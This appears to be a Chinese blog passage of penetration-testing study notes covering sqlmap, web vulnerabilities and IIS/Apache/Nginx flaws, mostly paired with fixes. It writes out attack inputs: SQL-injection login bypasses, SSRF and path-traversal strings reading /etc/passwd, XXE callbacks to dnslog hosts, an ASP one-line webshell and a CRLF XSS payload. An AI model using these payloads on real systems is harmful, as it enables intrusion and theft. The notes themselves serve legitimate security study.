<h3 id="3-渗透攻击"><a href="#3-渗透攻击" class="headerlink" title="3.渗透攻击"></a>3.渗透攻击</h3><p>专业的团队会综合以上所有的阶段收集回来的情报，特别是漏洞扫描结果，服务器的配置，防火墙的使用情况，通过分析确定可利用的和待挖掘的漏洞，选择针对性工具使用或开发。</p>
<h4 id="漏洞挖掘和利用"><a href="#漏洞挖掘和利用" class="headerlink" title="漏洞挖掘和利用"></a>漏洞挖掘和利用</h4><p>验证漏洞是否存在，最终getshell或拿到管理后台</p>
<p>owasp top10，web基本漏洞。</p>
<h3 id="4-提权和后门"><a href="#4-提权和后门" class="headerlink" title="4.提权和后门"></a>4.提权和后门</h3><p><a href="https://fishpond.blog.csdn.net/article/details/109450658">CSDN思源湖的鱼</a></p>
<h3 id="5-内网攻击"><a href="#5-内网攻击" class="headerlink" title="5.内网攻击"></a>5.内网攻击</h3><p><a href="https://fishpond.blog.csdn.net/article/details/117286294">CSDN思源湖的鱼</a></p>
<h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><p>漏洞自查，周期性自扫；</p>
<p>权限的检查</p>
<p>代码审查</p>
<p>敏感函数的使用</p>
<p>WAF</p>
<h2 id="渗透工具"><a href="#渗透工具" class="headerlink" title="渗透工具"></a>渗透工具</h2><h4 id="3-1-sqlmap"><a href="#3-1-sqlmap" class="headerlink" title="3.1 sqlmap"></a>3.1 sqlmap</h4><p>SQLMap是一个自动化的SQL注入工具，其主要功能是扫描、发现并利用给定URL的SQL注入漏洞，内置了很多绕过插件，支持的数据库是MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB。SQLMap采用了以下5种独特的SQL注入技术。</p>
<p>● 基于布尔类型的盲注，即可以根据返回页面判断条件真假的注入。</p>
<p>● 基于时间的盲注，即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行（即页面返回时间是否增加）来判断。</p>
<p>● 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中。</p>
<p>● 联合查询注入，在可以使用Union的情况下的注入。</p>
<p>● 堆查询注入，可以同时执行多条语句时的注入。</p>
<h3 id="3-漏洞发现"><a href="#3-漏洞发现" class="headerlink" title="3.漏洞发现"></a>3.漏洞发现</h3><p>传统漏洞</p>
<p>框架组件公开漏洞</p>
<p>口令漏洞</p>
<p>代码审计0day</p>
<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>拖库、提权（写文件webshell、MYSQL UDF、sqlserver xp_cmdshell）</p>
<h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><p>打管理员cookie、beef框架攻击管理员客户端</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230603172605460.png"></p>
<h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>linux系统LANMP、vulhub</p>
<p>Windows系统WAMP</p>
<p>安装一个phpstudy之后，去github找以下靶场，安装进对应www文件夹即可</p>
<blockquote>
<p>DVWA</p>
<p>sql-labs</p>
<p>xss-labs</p>
<p>pikachu</p>
</blockquote>
<p>还有在线靶场如hack the box</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞汇总</title>
    <url>/2023/07/01/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><p>字典爆破</p>
<h2 id="hacker101-micro-cms2"><a href="#hacker101-micro-cms2" class="headerlink" title="hacker101 micro-cms2"></a>hacker101 micro-cms2</h2><p>username为：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">admin&#x27; or 1=1 --  时</span><br></pre></td></tr></table></figure>

<p>登录窗口会提示无效的密码，那需要构造下密码，这是wp，我也不知道怎么尝试出来的</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">admin&#x27; union select &#x27;123&#x27; as password --</span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<h2 id="petshop"><a href="#petshop" class="headerlink" title="petshop"></a>petshop</h2><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>用sqlmap扫</p>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><code>...&amp;url=http://xxx</code></p>
<p><code>...&amp;url=file:///etc/passwd</code></p>
<p>修复方案：限制协议和target</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原因</span><br><span class="line">服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</span><br><span class="line">防御</span><br><span class="line">1.限制协议：仅允许http和https请求。</span><br><span class="line">2.限制IP：避免应用被用来获取内网数据，攻击内网。</span><br><span class="line">3.限制端口:限制请求的端口为http常用的端口，比如，80,443,8080,8090。</span><br><span class="line">4.过滤返回信息:验证远程服务器对请求的响应是比较简单的方法。</span><br><span class="line">统一错误信息:免用户可以根据错误信息来判断远端服务器的端口状态。</span><br><span class="line">有回显</span><br><span class="line">直接通过页面加载出目标资产，可先尝试加载http://www.baidu.com 页面确认有ssrf，如果成功的话，可进一步将百度换成内网IP，通过fuzz扫描内网资产。</span><br><span class="line">无回显</span><br><span class="line">1.先配合dnslog平台，测试dnslog平台能否获取到服务器的访问记录，如果没有对应记录，也可能是服务器不出网造成的，利用时可以通过请求响应时间判断内网资产是否存在，然后再利用内网资产漏洞（比如redis以及常见可RCE的web框架）证明漏洞的有效性。</span><br><span class="line">&quot;... &lt;!ENTITY test SYSTEM &quot;SSRF.xxxx.ceye.io\\aa&quot;&gt; ...&quot;</span><br><span class="line">&quot;... &lt;!ENTITY test SYSTEM &quot;SSRF.lkun0l.dnslog.cn\\aa&quot;&gt; ...&quot;</span><br><span class="line">2.使用burp的collaborator来进行尝试</span><br><span class="line">3.开启apache服务，在存在ssrf处访问http://10.1.1.200(本机服务地址)，查看服务器日志信息，打开日志确定是否被访问,确定是否存在ssrf漏洞。</span><br></pre></td></tr></table></figure>



<h1 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h1><p>ldap匿名访问</p>
<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h2 id="账号注册"><a href="#账号注册" class="headerlink" title="账号注册"></a>账号注册</h2><p>任意注册：验证码仅4位数字，可以爆破</p>
<p>修复方案：增加验证码长度，且超过一定次数重置</p>
<h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><p>登入页面，遇到用户的照片处，右键在新标签处打开，暴露了路径，从而泄露所有用户照片、甚至信息等。</p>
<p>修复方案：设置访问控制；文件路径保护（哈希）；服务器端代理（客户端与服务端之间有一个代理，通过代理传递信息，这样客户端不会直接访问到服务端）</p>
<p>重要站点备份文件泄露：比如xxx&#x2F;.svn&#x2F;entries</p>
<h1 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h1><p>平行越权</p>
<p>注册两个账号A和B，A,B同时订单，A作为攻击者取消订单时，抓包，参数修改为B的id，将B的订单取消。</p>
<h2 id="hacker101-postbook"><a href="#hacker101-postbook" class="headerlink" title="hacker101,postbook."></a>hacker101,postbook.</h2><p>1.发布博客时，有一个user_id参数，起到指定某用户的作用，如果改这个id，造成的效果，应该是<strong>以其他用户的名义，发布内容</strong></p>
<p>2.编辑博客时，url上的id更改后，<strong>会编辑它人的博客内容</strong></p>
<p>3.删除操作时，url会有id&#x3D;1f0e3dad99908345f7439f8ffabdffc4，其实是md5加密，解密为19；所以需要尝试其他人博客的id，md5替换之后，<strong>删除它人的博客内容</strong></p>
<p>4.cookie的保持会话，里面有 id&#x3D;1679091c5a880faf6fb5e6087eb1b2dc; md5解密后，内容为6；即代表了该用户，如果改为id&#x3D;1的用户（md5之后），<strong>就能登录id&#x3D;1用户</strong></p>
<p>5.登录的弱口令user,passwod</p>
<p>6.f12的form格式</p>
<p>7.189 * 5</p>
<h2 id="hackker101-购物车"><a href="#hackker101-购物车" class="headerlink" title="hackker101 购物车"></a>hackker101 购物车</h2><p>1.添加商品，付款时，抓包，post会携带商品的信息列表，其中有price，尝试将price改为0，<strong>金额更改成功</strong></p>
<p>2.扫一下目录，<strong>有login；那就暴力破解</strong>，哎一个好的字典</p>
<p>3.？</p>
<h1 id="未授权访问-1"><a href="#未授权访问-1" class="headerlink" title="未授权访问"></a>未授权访问</h1><p>登入页面，导入文件，下载文件，抓包；更换浏览器对下载链接进行访问。</p>
<h3 id="hacker101-micro-cms2-1"><a href="#hacker101-micro-cms2-1" class="headerlink" title="hacker101 micro-cms2"></a>hacker101 micro-cms2</h3><p>在编辑api版块，抓包，删除Cookie。</p>
<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>日记或者留言（存储性xss）</p>
<p>构造短连接，用xss平台接收，可以接收到浏览者的cookie等信息</p>
<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>hacker101里的，postbook:</p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件上传漏洞是指文件上传功能没有对上传的文件做合理严谨的过滤，导致用户可以利用此功能，上传能被服务端解析执行的文件，并通过此文件获得执行服务端命令的能力</span><br><span class="line">通过利用任意文件上传漏洞可以最快获取WebShell，一般常见有三种情况：</span><br><span class="line">1.站点没有任何防护，且上传点未做安全校验，则可直接上传WebShell文件。</span><br><span class="line">2.站点存在简单防护：</span><br><span class="line">前端校验文件后缀时，可先传允许的文件类型，然后抓包修改文件后缀。</span><br><span class="line">MIME校验时，抓包修改Conten-Type为允许MIME类型。</span><br><span class="line">3.CMS等的通用任意文件上传漏洞：绕过黑白名单、绕过文件内容检测、CMS的文件上传漏洞</span><br><span class="line">绕过waf</span><br><span class="line">1.数据溢出</span><br><span class="line">2.数据阶段：%00截断    </span><br><span class="line">原理：C语言中字符串的结束标识符%00是结束符号，而PHP就是C写的，所以继承了C的特性，所以判断为%00是结束符号不会继续往后执行</span><br><span class="line">3.去掉双引号绕过</span><br><span class="line">4.文件名后缀大小写绕过</span><br><span class="line"></span><br><span class="line">文件上传中include和require的区别</span><br><span class="line">1.加载失败的处理方式及不同</span><br><span class="line">include引入文件失败后会继续执行</span><br><span class="line">require失败后停止执行</span><br><span class="line">2.</span><br><span class="line">Include是有条件包含函数</span><br><span class="line">include &#x27;file.php&#x27;; //file.php不会被引入</span><br><span class="line">Require是无条件包含函数</span><br><span class="line">require &#x27;file.php&#x27;; //file.php将会被引入</span><br><span class="line">3.文件引用方式</span><br><span class="line">Include有返回值</span><br><span class="line">Require没有返回值</span><br></pre></td></tr></table></figure>

<h1 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h1><p>原理，利用，防御</p>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>运行应用程序的服务器上的任意文件。 这可能包括应用程序代码和数据，后端系统的登录信息以及敏感的操作系统文件。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>比如，web显示某些图片时，</p>
<p><code>&lt;img src=&quot;/loadImage?filename=214.png&quot;&gt;</code></p>
<p>该图片文件的位置若是被猜解到的话</p>
<p>比如存在，<code>var/www/images/214.png</code></p>
<p>可构造如下：</p>
<p><code>https://www.*****.com/loadImage?filename=../../../etc/passwd</code></p>
<p>即:<code>/var/www/images/../../../etc/passwd</code>&#x3D;&#x3D;&#x2F;etc&#x2F;passwd</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1.绝对路径：</p>
<blockquote>
<p>由于..&#x2F;被过滤，可直接写filename&#x3D;&#x2F;etc&#x2F;passwd</p>
</blockquote>
<p>2.双写..&#x2F;绕过：</p>
<blockquote>
<p><code>filename=....//....//....///etc/passwd</code></p>
<p>….&#x2F;&#x2F;过滤掉一个..&#x2F;还剩下..&#x2F;</p>
</blockquote>
<p>3.URL编码绕过:</p>
<blockquote>
<p>.  &#x3D;&gt; %2e</p>
<p>&#x2F;  &#x3D;&gt; %2f</p>
<p>% &#x3D;&gt; %25 (双重URL编码):即.被过滤了，尝试%2e也被过滤了，尝试%252e，三者是相等的</p>
</blockquote>
<ol start="4">
<li>绝对路径配合..&#x2F;</li>
</ol>
<blockquote>
<p>filename&#x3D;&#x2F;var&#x2F;www&#x2F;images&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>
</blockquote>
<p>5.截断文件后缀:对文件类型作了限制</p>
<blockquote>
<p>&#x2F;etc&#x2F;passwd%00.jpg</p>
</blockquote>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>避免将用户提供的输入完全传递给文件系统API。</p>
<p> 平台文件系统API规范化路径</p>
<h1 id="war后门"><a href="#war后门" class="headerlink" title="war后门"></a>war后门</h1><h2 id="成因："><a href="#成因：" class="headerlink" title="成因："></a>成因：</h2><p>Tomcat 支持在后台部署war文件，那么可以直接将webshell部署到web目录下</p>
<h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h2><p>1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。</p>
<p>2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME&#x2F;conf&#x2F;web.xml文件设置锁定机制和时间超时限制。</p>
<h1 id="远程命令-x2F-代码执行"><a href="#远程命令-x2F-代码执行" class="headerlink" title="远程命令&#x2F;代码执行"></a>远程命令&#x2F;代码执行</h1><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>输入过滤不严，使用了不安全命令执行函数</p>
<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>如php代码中直接调用系统函数shell_exec将用户输入的内容拼接进来</p>
<p>127.0.0.1|ipconfig 页面直接输出了ipconfig的内容。</p>
<blockquote>
<p>1.exec():执行一个外部程序</p>
<p>2.system()<br>输出执行结果，返回最后一行。<br>如果PHP运行在服务器模块中，system()函数还会尝试在每行输出完毕之后，自动刷新web服务器的输出缓存。<br>3.passthru()<br>执行外部程序并且显示原始输出。同exec()函数类似，passthru()函数也是用来执行外部命令的。当所执行的Unix命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代exec()或system()函数。常用来执行诸如pbmplus之类的可以直接输出图像流的命令。<br>4.shell_exec()<br>通过shell环境执行命令，并且将完整的输出以字符串的方式返回。该函数会在错误出现或者程序执行没有输出两种情况下返回NULL，也就是说，没有办法通过该函数检测程序执行失败（可以改用exec）。<br>5.popen()<br>打开一个指向进程的管道，该进程由派生指定的 command 命令执行而产生。返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向的（只能用于读或写），此指针可以用于 fgets()，fgetss() 和 fwrite()。并且必须用 pclose() 来关闭。若出错，则返回 false。<br>6.proc_open()<br>执行一个命令，并且打开用来输入&#x2F;输出的文件指针。</p>
</blockquote>
<h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><blockquote>
<p>eval()            把字符串作为PHP代码执行<br>assert()          检查一个断言是否为 FALSE，可用来执行代码<br>preg_replace()    执行一个正则表达式的搜索和替换<br>call_user_func()  把第一个参数作为回调函数调用<br>call_user_func_array() 调用回调函数，并把一个数组参数作为回调函数的参数<br>array_map()       为数组的每个元素应用回调函数</p>
</blockquote>
<h2 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h2><p>1.尽量不要使用命令执行函数。<br>2.客户端提交的变量在进入执行命令函数前要做好过滤和检测。<br>3.在使用动态函数之前，确保使用的函数是指定的函数之一。<br>4.对PHP语言来说，不能完全控制的危险函数最好不要使用。</p>
<h1 id="端口漏洞"><a href="#端口漏洞" class="headerlink" title="端口漏洞"></a>端口漏洞</h1><table>
<thead>
<tr>
<th>27017</th>
<th>mongodb，漏洞：未授权访问</th>
</tr>
</thead>
<tbody><tr>
<td>27017</td>
<td>mongodb，漏洞：爆破，未授权</td>
</tr>
<tr>
<td>27018</td>
<td>mongodb，漏洞：未授权</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>3306</th>
<th>mysql，漏洞：爆破，拒绝服务，注入</th>
</tr>
</thead>
<tbody><tr>
<td>3389</td>
<td>rdp&#x2F;windows远程连接，漏洞：爆破，shift后门，3389漏洞攻击</td>
</tr>
</tbody></table>
<p>3389连接不上的原因：</p>
<blockquote>
<p>1.端口更改</p>
<p>2.防火墙</p>
<p>3.目标机在内网</p>
</blockquote>
<table>
<thead>
<tr>
<th>445</th>
<th>smb，漏洞：溢出漏洞</th>
</tr>
</thead>
<tbody><tr>
<td>6379</td>
<td>redis，漏洞：弱口令，未授权访问</td>
</tr>
</tbody></table>
<p>SMB（全称是Server Message Block）是一个<strong>协议服务器信息块</strong>，它是一种客户机&#x2F;服务器、请求&#x2F;响应协议，通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的<strong>网上邻居</strong>就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP&#x2F;IP协议之上，SMB使用TCP139端口和TCP445端口。</p>
<p>永恒之蓝是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。通过永恒之蓝漏洞会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
<p><a href="https://blog.csdn.net/m0_66908617/article/details/128978456">永恒之蓝部分筛选自CSDN博主「小P0~0」的原创文章</a></p>
<p><a href="https://blog.csdn.net/qq_42430287/article/details/124407613">端口部分筛选自CSDN博主「Bolgzhang」的原创文章</a></p>
<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>java、shiro、php</p>
<h1 id="Web中间件"><a href="#Web中间件" class="headerlink" title="Web中间件"></a>Web中间件</h1><h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><p>Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p>
<h3 id="Put漏洞"><a href="#Put漏洞" class="headerlink" title="Put漏洞"></a>Put漏洞</h3><h4 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h4><p>IIS Server 在 Web 服务扩展中开启了 <strong>WebDAV</strong> ，配置了可以写入的权限，造成<strong>任意文件上传。</strong></p>
<p>版本： IIS6.0</p>
<h4 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h4><p>开启了webDAV的写入权限后，抓包，将GET请求改为OPTIONS，可以看到响应内容有PUT。</p>
<p>IIS put scanner扫描一下判断是否允许put方法</p>
<p>使用iiswrite工具进行iis put漏洞测试利用，首先使用PUT方法进行绕过，上传包含<strong>asp</strong>一句话木马的test.txt文件，</p>
<p>如<code>&lt;%execute(request(&quot;a&quot;))%&gt;</code></p>
<p>再用MOVE方法，将txt转化为木马文件，</p>
<p>从而蚁剑，getshell。</p>
<p>PS:如果网站属性未允许脚本资源访问，MOVE方法修改txt文件会报错。</p>
<p>可以利用IIS目录解析漏洞，MOVE方式时，将shell.asp改写为<strong>shell.asp;.txt</strong></p>
<p>蚁剑连接..&#x2F;shell.asp;.txt 即可。</p>
<h4 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h4><p>关闭WebDAV和写权限</p>
<p>禁用访客写入权限</p>
<h3 id="短文件名猜解"><a href="#短文件名猜解" class="headerlink" title="短文件名猜解"></a>短文件名猜解</h3><h4 id="成因-2"><a href="#成因-2" class="headerlink" title="成因"></a>成因</h4><p>它使用8个字符的文件名，后面跟着句点和三个字符的文件扩展名。文件名超过八个，<strong>则会显示：波浪号+数字表示截断部分</strong></p>
<p>IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404(未找到文件或目录)，访问构造的某个不存在的短文件名，返回400(错误请求)。</p>
<p>使用的是IIS6.0（&lt;8.0），需要在web服务拓展里开启<strong>ASP.NET</strong></p>
<h4 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h4><p>若存在一个文件bbccddee.html以及文件夹webtest_efwef</p>
<p><code>http://xxx/we*~1*/a.aspx</code> 返回404 则存在文件夹</p>
<p><code>http://xxx/wa*~1*/a.aspx</code> 返回400 即bad，不存在该文件夹</p>
<p><strong>最多判断长度为6个</strong>即<em><em>webtes</em>~1</em>&#x2F;a.aspx**</p>
<p><code>../webtes*~1/a.aspx</code>判断类型，404则表示是文件夹，400表示文件</p>
<p>可以进而判断文件类型</p>
<p><code>../bbccdd*~1.a*/a.aspx</code> 返回400，不是该后缀</p>
<p><code>../bbccdd*~1.h*/a.aspx</code>返回404，则继续</p>
<p><code>../bbccdd*~1.htm*/a.aspx</code>返回404，则确认后缀为html；<strong>短文件名后缀最长为3。</strong></p>
<p>同理可猜解到shell.asp;.txt文件， <code>../shella*~1.txt*/a.aspx</code></p>
<h4 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h4><p>升级.net framework</p>
<p>修改注册表禁用短文件名功能</p>
<p>CMD关闭NTFS 8.3文件格式的支持</p>
<p>将web文件夹的内容拷贝到另一个位置，如c:\www到d:\w,然后删除原文件夹，再重命名d:\w到c:\www。</p>
<h4 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h4><ol>
<li>此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解；</li>
<li>如果文件名本身太短（无短文件名）也是无法猜解的；</li>
<li>如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配；</li>
</ol>
<h3 id="远程代码执行1"><a href="#远程代码执行1" class="headerlink" title="远程代码执行1"></a>远程代码执行1</h3><h4 id="成因-3"><a href="#成因-3" class="headerlink" title="成因"></a>成因</h4><p>在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。</p>
<h4 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h4><h4 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h4><p>1）关闭 WebDAV 服务</p>
<p>2） 使用相关防护设备</p>
<h3 id="远程代码执行2"><a href="#远程代码执行2" class="headerlink" title="远程代码执行2"></a>远程代码执行2</h3><h4 id="成因-4"><a href="#成因-4" class="headerlink" title="成因"></a>成因</h4><p>iis默认启用内核缓存，执行与请求处理管道中缓存有关的任务。当HTTP协议堆栈（HTTP.sys）<strong>不正确地解析HTTP请求</strong>时会导致IIS远程代码执行漏洞。</p>
<p>安装了微软IIS 6.0以上的win 7&#x2F;8&#x2F;8.1&#x2F;2008 R2&#x2F;2012&#x2F;2012 R2都受到这个漏洞的影响。</p>
<h4 id="利用-5"><a href="#利用-5" class="headerlink" title="利用"></a>利用</h4><p>…</p>
<h4 id="防御-6"><a href="#防御-6" class="headerlink" title="防御"></a>防御</h4><p>打补丁</p>
<h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="成因-5"><a href="#成因-5" class="headerlink" title="成因"></a>成因</h4><p>IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。这一漏洞有两种完全不同的利用方式：</p>
<p>&#x2F;test.asp&#x2F;test.jpg</p>
<p>test.asp;.jpg</p>
<h4 id="利用1"><a href="#利用1" class="headerlink" title="利用1"></a>利用1</h4><p>第一种是新建一个名为 “test.asp” 的目录，该目录中的任何文件都被 IIS 当作 asp 程序执行（特殊符号是 “&#x2F;” ）</p>
<h4 id="利用2"><a href="#利用2" class="headerlink" title="利用2"></a>利用2</h4><p>上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行</p>
<p><strong>IIS7.5 文件解析漏洞</strong></p>
<p>test.jpg&#x2F;.php</p>
<p>URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理。</p>
<p>即 php 修理文件路径 “test.jpg&#x2F;.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。</p>
<h4 id="防御-7"><a href="#防御-7" class="headerlink" title="防御"></a>防御</h4><p>1）对新建目录文件名进行过滤，不允许新建包含‘.’的文件</p>
<p>2）曲线网站后台新建目录的功能，不允许新建目录</p>
<p>3）限制上传的脚本执行权限，不允许执行脚本</p>
<p>4）过滤.asp&#x2F;xm.jpg，通过ISApi组件过滤</p>
<h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>由于其 跨平台 和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将 Perl&#x2F; Python等 解释器编译到服务器中。</p>
<h3 id="解析漏洞-1"><a href="#解析漏洞-1" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="成因-6"><a href="#成因-6" class="headerlink" title="成因"></a>成因</h4><p>用户配置问题，Apache默认一个文件可以有多个以点分隔的后缀，对于后缀名是从右往左解析。</p>
<h4 id="利用-6"><a href="#利用-6" class="headerlink" title="利用"></a>利用</h4><p>shell.xxx.yyy，先解析yyy，不存在，再解析xxx</p>
<h4 id="防御-8"><a href="#防御-8" class="headerlink" title="防御"></a>防御</h4><p>将AddHandler application&#x2F;x-httpd-php .php的配置文件删除。</p>
<h3 id="目录遍历-1"><a href="#目录遍历-1" class="headerlink" title="目录遍历"></a>目录遍历</h3><h4 id="成因-7"><a href="#成因-7" class="headerlink" title="成因"></a>成因</h4><p>由于配置错误导致的目录遍历。</p>
<h4 id="利用-7"><a href="#利用-7" class="headerlink" title="利用"></a>利用</h4><p>访问ip地址，可以看到所有文件或目录</p>
<h4 id="防御-9"><a href="#防御-9" class="headerlink" title="防御"></a>防御</h4><p>修改apache配置文件httpd.conf</p>
<p>找到Options+Indexes+FollowSymLinks +ExecCGI并修改成 Options-Indexes+FollowSymLinks +ExecCGI 并保存；</p>
<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP&#x2F;POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好</p>
<h3 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h3><h4 id="成因-8"><a href="#成因-8" class="headerlink" title="成因"></a>成因</h4><p>对任意文件名，在后面添加&#x2F;任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加test.jpg&#x2F;x.php进行解析攻击。会解析为test.php</p>
<h4 id="利用-8"><a href="#利用-8" class="headerlink" title="利用"></a>利用</h4><p>如果里面刚好写有php代码，会以php文件执行</p>
<h4 id="防御-10"><a href="#防御-10" class="headerlink" title="防御"></a>防御</h4><p>1） 将php.ini文件中的cgi.fix_pathinfo的值设为0.这样php在解析1.php&#x2F;1.jpg这样的目录时，只要1.jpg不存在就会显示404；</p>
<p>2） 将&#x2F;etc&#x2F;php5&#x2F;fpm&#x2F;pool.d&#x2F;<a href="http://www.conf/">www.conf</a>中security.limit_ectensions后面的值设为.php</p>
<h3 id="目录遍历-2"><a href="#目录遍历-2" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>类似于apache，配置不当造成目录内容的泄露</p>
<p>将&#x2F;etc&#x2F;nginx&#x2F;sites-avaliable&#x2F;default里的autoindex on改为autoindex off</p>
<h3 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h3><h4 id="成因-9"><a href="#成因-9" class="headerlink" title="成因"></a>成因</h4><p>CRLF时“回车+换行”（\r\n）的简称。</p>
<p>HTTP Header与HTTP Body时用两个CRLF分隔的，浏览器根据两个CRLF来取出HTTP内容并显示出来。</p>
<p>通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行。</p>
<h4 id="利用-9"><a href="#利用-9" class="headerlink" title="利用"></a>利用</h4><p>抓包，在url请求上加入&#x2F;%0d%0a%0d%0a&lt;img src&#x3D;1 onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;</p>
<h4 id="防御-11"><a href="#防御-11" class="headerlink" title="防御"></a>防御</h4><p>Nginx的配置文件&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;error1.conf修改为使用不解码的url跳转。</p>
<h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><h4 id="成因-10"><a href="#成因-10" class="headerlink" title="成因"></a>成因</h4><p>Nginx反向代理，静态文件存储在&#x2F;home&#x2F;下，而访问时需要在url中输入files，配置文件中&#x2F;files没有用&#x2F;闭合，导致可以穿越至上层目录。</p>
<h4 id="利用-10"><a href="#利用-10" class="headerlink" title="利用"></a>利用</h4><p>即可以实现目录跳转，显示为</p>
<p>..&#x2F;</p>
